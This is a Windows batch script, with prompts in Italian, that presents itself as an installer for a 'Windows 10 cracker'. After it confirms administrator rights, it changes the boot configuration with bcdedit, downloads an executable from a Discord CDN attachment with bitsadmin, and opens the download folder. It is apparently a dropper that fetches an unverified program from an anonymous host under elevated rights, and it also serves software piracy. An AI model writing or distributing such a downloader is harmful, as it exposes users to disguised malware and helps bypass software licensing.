@echo off
color c
net session >nul 2>&1
if %errorLevel% == 0 (
    echo Programma aperto come amministratore! Continuando...
    goto continua
) else (
    echo Devi avviare il programma come amministratore!
    goto fine
)
:continua
bcdedit -set TESTSIGNING OFF
cd C:\Users\%USERNAME%\Downloads
mkdir Windows-Cracker-Github
bitsadmin.exe /transfer "Installer" https://cdn.discordapp.com/attachments/653666644689682462/964184459933011988/windows10cracker.exe C:\Users\%USERNAME%\Downloads\Windows-Cracker-Github\windows10cracker.exe
explorer.exe C:\Users\%USERNAME%\Downloads\Windows-Cracker-Github
pause
:fine
pause
